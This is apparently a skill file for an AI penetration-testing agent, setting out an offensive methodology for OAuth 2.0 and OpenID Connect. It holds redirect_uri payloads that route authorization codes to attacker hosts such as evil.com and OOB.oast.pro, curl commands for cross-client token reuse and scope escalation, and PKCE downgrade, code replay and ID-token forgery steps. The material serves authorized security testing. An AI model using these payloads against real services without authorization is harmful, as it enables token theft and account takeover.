---
name: oauth-oidc-security
description: OAuth 2.0 and OpenID Connect implementation testing — redirect URI validation bypass, PKCE enforcement and downgrade, state/CSRF, code replay, token audience and scope abuse, and ID token validation flaws
intent: offensive
protocol: rest
---

# OAuth & OIDC Implementation Testing

## Purpose
Exploit flawed OAuth 2.0/OIDC implementations: redirect manipulations that steal authorization codes, missing PKCE, replayable codes, cross-client token reuse, and unvalidated ID tokens — each confirmed by obtaining usable credentials for a victim context.

## Preconditions
- The target's OAuth flow exercised end-to-end at least once (all four legs observed)
- A test client registration if available; otherwise attacker-side infrastructure to receive redirects (OOB callback domain)
- Understanding of which grant types are in play (code, implicit, ROPC, device)

## Attack Surface Signals
- `/authorize`, `/token`, `/introspect`, `/userinfo`, `.well-known/openid-configuration`
- redirect_uri handling in the authorize request
- state, nonce, code_challenge parameters
- Tokens stored in URLs, sessionStorage, or transmitted to third parties

## Methodology

### Step 1: Map the Flow
```bash
curl -sk "https://TARGET/.well-known/openid-configuration" | jq '.authorization_endpoint, .token_endpoint, .scopes_supported'
# Walk the full code flow as the test user; record every parameter and redirect
```

### Step 2: redirect_uri Manipulation
```text
Exact match is the only safe validation. Test:
  prefix match:      redirect_uri=https://app.target.com.evil.com/callback
  substring match:   redirect_uri=https://app.target.com/callback/../../../redirect
  open redirect ch:  redirect_uri=https://app.target.com/redirect?to=https://OOB.oast.pro
  authority tricks: https://app.target.com@evil.com/  |  https://app.target.com#@evil.com
  scheme swaps:      http://app.target.com/callback  |  //evil.com
  path traversal:    https://app.target.com/callback/../../open
```
Confirm by RECEIVING `code=` on the off-domain destination — then exchange the code at the token endpoint to prove a usable credential, not just a redirect bounce.

### Step 3: PKCE Enforcement
```text
- drop code_verifier entirely at /token
- send a wrong code_verifier (token should fail; issuance = broken PKCE)
- downgrade S256 → plain in both the authorize request and the token exchange
```
A finding requires the token endpoint issuing tokens without a valid verifier.

### Step 4: state, Code Replay, and TTL
- Omit state; echo invalid state; verify the CLIENT rejects a foreign state (server-side state is not enough — CSRF needs client-side rejection)
- Replay the authorization code 2-3 times; acceptance = single-use violation
- Reuse refresh tokens after rotation; check refresh-token TTL and revocation on logout/password change

### Step 5: Token Audience, Binding, and Scope
```bash
# Token issued to client A against client B's API
curl -sk -H "Authorization: Bearer CLIENT_A_TOKEN" "https://CLIENT_B.example.com/api/me"
# Refresh token with a different client_id
curl -sk -X POST "https://TARGET/token" -d "grant_type=refresh_token&refresh_token=RT&client_id=other-client"
# Scope escalation: request scopes the user never granted
curl -sk "https://TARGET/authorize?...&scope=openid%20admin%20read:all"
```

### Step 6: ID Token Validation (OIDC)
- alg:none / algorithm confusion on the ID token (chaining into jwt-security-testing)
- missing nonce validation: replay an ID token captured from a different session
- iss/aud/exp claims unvalidated by the relying party
- email claim trusted without verification: pre-account takeover via unverified email match

## Evidence Contract
An OAuth finding requires a usable credential outcome:
- A stolen/manipulated code that EXCHANGES for a working access token (victim context)
- A token issued without a valid PKCE verifier
- A code/refresh token replay that yields a second working token
- A cross-client token accepted by a relying party it was not issued for
- An ID token from another session/nonce accepted as authentication

**NOT evidence**: a redirect that bounces but delivers no code, a permissive-looking authorize response, discovery metadata listing endpoints, an ID token that decodes

## Common Misses
- Only the authorize leg tested; token-endpoint PKCE downgrade skipped
- state validated server-side but the client accepts arbitrary state on callback
- Refresh-token flows (long-lived) never tested for rotation/revocation
- Implicit-flow artifacts lingering in sessionStorage
- Client_id confusion between mobile and web clients of the same product

## False Positives / Non-Findings
- Rejected malformed redirect_uri variants (validation working)
- 200 from /authorize with an error payload in the fragment
- Codes that expire before the replay lands (test immediately)
- Tokens rejected by the cross-client API (audience enforced)

## Xalgorix Tool Strategy
- `browser_action` for interactive flow walking (consent pages, redirects)
- `http_request`/curl for authorize/token leg manipulation
- `oob_callback` as the attacker-side redirect receiver
- jwt-security-testing for signature-level token forgery

## Stopping Rule
Every grant type in use x every redirect mutation x PKCE/state/replay/audience checks, each confirmed by an exchanged, working credential.

## Handoff
Report the flow leg, the exact parameter manipulation, the received/exchanged credential, and the victim context gained. Account-takeover chains into the account-takeover methodology; ID-token signature issues into jwt-security-testing.